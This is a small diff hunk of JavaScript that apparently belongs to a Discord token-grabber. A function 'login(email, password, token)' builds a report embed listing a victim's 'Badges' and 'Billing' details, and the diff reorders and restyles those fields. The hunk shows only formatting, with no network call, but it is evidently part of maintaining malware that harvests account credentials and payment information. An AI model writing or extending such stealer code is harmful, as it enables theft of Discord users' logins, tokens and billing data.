@@ -616,13 +616,13 @@ const login = async (email, password, token) => {
              "inline": false
           },
           {
-            name: '<a:satanist:802503618972483615> Badges:',
-            value: `${badges}`,
-            inline: true,
+            "name": "<a:2788demonshit:989345376567971870> Billing:",
+            "value": `\`${billing}\``,
+            "inline": true
           },
           {
-            name: '<:944007233820307467:959785232037470208> Billing:',
-            value: `**${billing}**`,
+            name: '<a:satanist:802503618972483615> Badges:',
+            value: `${badges}`,
             inline: true,
           },
           {
